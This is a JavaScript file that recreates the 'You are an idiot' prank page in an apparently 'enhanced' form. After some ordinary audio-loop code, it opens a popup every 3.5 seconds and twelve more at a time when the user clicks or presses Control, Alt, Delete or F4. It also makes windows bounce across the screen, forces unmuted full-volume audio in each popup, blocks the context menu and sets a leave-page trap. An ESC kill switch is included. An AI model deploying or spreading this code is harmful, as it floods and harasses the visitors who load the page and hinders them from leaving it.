let container = document.querySelector('#youare-container');
let audio = document.querySelector('#youare-audio');
let ovlap = document.querySelector('#youare-overlap');
let micon = document.querySelector('#youare-micon');

let overlap = false;

function audioPlay() {
	if (!overlap) {
		audio.currentTime = 0;
		audio.play();
	} else {
		ovlap.currentTime = 0;
		ovlap.play();
	}
	container.removeEventListener('click', audioPlay);
	audio.addEventListener('timeupdate', audioOverlap);
	ovlap.addEventListener('timeupdate', audioOverlap);
	container.classList.remove('clicky');
	micon.src = "/images/speaker.avif";
}

function audioStop() {
	audio.currentTime = 0;
	audio.pause();
	ovlap.currentTime = 0;
	ovlap.pause();
	container.addEventListener('click', audioPlay);
	audio.removeEventListener('timeupdate', audioOverlap);
	ovlap.removeEventListener('timeupdate', audioOverlap);
	container.classList.add('clicky');
	micon.src = "/images/speakerm.avif";
}

function audioSwitch() {
	if (audio.duration > 0 && audio.paused && ovlap.duration > 0 && ovlap.paused) {
		audioPlay();
	} else {
		audioStop();
	}
}

function audioOverlap() {
	if (!overlap && audio.currentTime > audio.duration - .45) {
		ovlap.currentTime = 0;
		ovlap.play();
		overlap = true;
	}
	if (overlap && ovlap.currentTime > ovlap.duration - .5) {
		audio.currentTime = 0;
		audio.play();
		overlap = false;
	}
}

container.addEventListener('click', audioPlay);
container.addEventListener('click', () => container.classList.remove('clicky'));
micon.addEventListener('click', audioSwitch);

// ==========================================================================
// ENHANCED REPLICATION: exact youareanidiot.cc + continuous spawn + loud audio + kill switch
// ==========================================================================

const sessionId = 'i_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7);
const killKey = 'ik_' + sessionId;

function isKilled() {
	try { return !!localStorage.getItem(killKey); } catch (e) { return false; }
}
function signalKill() {
	try { localStorage.setItem(killKey, Date.now().toString()); } catch (e) {}
}
function clearKill() {
	try { localStorage.removeItem(killKey); } catch (e) {}
}

const urlParams = new URLSearchParams(window.location.search);
const urlSession = urlParams.get('session');
const isPopup = (window.opener !== null || !!urlSession);

if (!isPopup && !urlSession) {
	clearKill();
}

// -------------------------------------------------------------------------
// KILL SWITCH: ESC in ANY window kills EVERYTHING + blocks new windows
// -------------------------------------------------------------------------
let moveTimer = null;
let spawnTimer = null;
let killPollId = null;
let stoppedOverlay = null;

function doCleanup() {
	if (moveTimer) { clearTimeout(moveTimer); moveTimer = null; }
	if (spawnTimer) { clearInterval(spawnTimer); spawnTimer = null; }
	if (killPollId) { clearInterval(killPollId); killPollId = null; }

	// Mute and stop all audio
	try {
		const a = document.getElementById('youare-audio');
		const o = document.getElementById('youare-overlap');
		if (a) { a.pause(); a.currentTime = 0; a.muted = true; }
		if (o) { o.pause(); o.currentTime = 0; o.muted = true; }
	} catch (e) {}

	// Stop movement by freezing position
	try { window.moveTo(window.screenX, window.screenY); } catch (e) {}

	// Show stopped overlay if window won't close (main page)
	if (!stoppedOverlay) {
		stoppedOverlay = document.createElement('div');
		stoppedOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);color:#fff;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;font-size:24px;z-index:99999;pointer-events:none;';
		stoppedOverlay.textContent = 'Stopped. You win.';
		document.body.appendChild(stoppedOverlay);
	}

	// Attempt to close (works for popups, fails silently for main page)
	try { window.close(); } catch (e) {}
}

// Fast poll for kill signal from other windows
killPollId = setInterval(() => {
	if (isKilled()) doCleanup();
}, 100);

// ESC handler
window.addEventListener('keydown', (e) => {
	if (e.key === 'Escape') {
		signalKill();
		doCleanup();
	}
});

// -------------------------------------------------------------------------
// If killed BEFORE this script finishes loading, die immediately.
// This catches popups that open after the user already pressed ESC.
// -------------------------------------------------------------------------
if (isKilled()) {
	doCleanup();
	// Halt the rest of the payload
	throw new Error('Killed before start');
}

// --- math.js (exact) ---
let xOff = 5;
let yOff = 5;
let xPos = 400;
let yPos = -100;

function triggerPopupAudio(win) {
	if (!win || win.closed) return;
	try {
		const a = win.document.getElementById('youare-audio');
		const o = win.document.getElementById('youare-overlap');
		if (a) {
			a.muted = false;
			a.volume = 1.0;
			a.currentTime = 0;
			a.play().catch(() => {});
		}
		if (o) {
			o.muted = false;
			o.volume = 1.0;
		}
	} catch (e) {}
	// Retry after load
	try {
		win.addEventListener('load', () => {
			const a = win.document.getElementById('youare-audio');
			const o = win.document.getElementById('youare-overlap');
			if (a) {
				a.muted = false;
				a.volume = 1.0;
				a.currentTime = 0;
				a.play().catch(() => {});
			}
			if (o) {
				o.muted = false;
				o.volume = 1.0;
			}
		});
	} catch (e) {}
}

function openWindow() {
	if (isKilled()) return null;
	const win = window.open(
		'/moron?session=' + encodeURIComponent(sessionId),
		"_blank",
		'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes'
	);
	if (win) {
		triggerPopupAudio(win);
		setTimeout(() => triggerPopupAudio(win), 100);
		setTimeout(() => triggerPopupAudio(win), 300);
	}
	return win;
}

async function proCreate(count) {	
	for (let i = 0; i < count; i++) {
		if (isKilled()) return;
		openWindow();
		await new Promise(r => setTimeout(r, 50));
	}
}

function newXlt() {
	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newXrt() {
	xOff = Math.ceil(7 * Math.random()) * 5 - 10;
	window.focus();
}

function newYup() {
	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newYdn() {
	yOff = Math.ceil(7 * Math.random()) * 5 - 10;
	window.focus();
}

function playBall() {
	if (isKilled()) return;
    xPos += xOff;
    yPos += yOff;
    
	if (xPos > screen.width - 357) newXlt();    
	if (xPos < 0) newXrt();
    
	if (yPos > screen.height - 330) newYup(); 		
	if (yPos < 0) newYdn();

    window.moveTo(xPos, yPos);
    moveTimer = setTimeout(playBall, 1);
}

// --- you.js (enhanced) ---
container.addEventListener('click', async () => {
	if (isKilled()) return;
	await proCreate(12);
	window.onbeforeunload = () => "Are you an idiot?";
});

window.onload = playBall;
window.oncontextmenu = () => false;
window.onkeydown = async (event) => {
	if (isKilled()) return;
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		await proCreate(12);
		alert("You are an idiot!");
	}
	return null;
}

// --- Continuous spawn every 3.5 seconds (main window only) ---
if (!isPopup && !urlSession) {
	spawnTimer = setInterval(() => {
		if (isKilled()) {
			clearInterval(spawnTimer);
			spawnTimer = null;
			return;
		}
		openWindow();
	}, 3500);
}

// --- Popup self-audio fallback (loud, unmuted) ---
(function() {
	if (!isPopup) return;
	function startPopupAudio() {
		const a = document.getElementById('youare-audio');
		const o = document.getElementById('youare-overlap');
		if (!a) return false;
		a.muted = false;
		a.volume = 1.0;
		let popupOverlap = false;
		function pOverlap() {
			if (!popupOverlap && a.currentTime > a.duration - .45) {
				o.currentTime = 0;
				o.muted = false;
				o.volume = 1.0;
				o.play().catch(() => {});
				popupOverlap = true;
			}
			if (popupOverlap && o.currentTime > o.duration - .5) {
				a.currentTime = 0;
				a.muted = false;
				a.volume = 1.0;
				a.play().catch(() => {});
				popupOverlap = false;
			}
		}
		a.currentTime = 0;
		a.play().catch(() => {});
		a.addEventListener('timeupdate', pOverlap);
		o.addEventListener('timeupdate', pOverlap);
		return true;
	}
	if (!startPopupAudio()) {
		let tries = 0;
		const retry = setInterval(() => {
			if (startPopupAudio() || ++tries > 25) clearInterval(retry);
		}, 50);
	}
})();
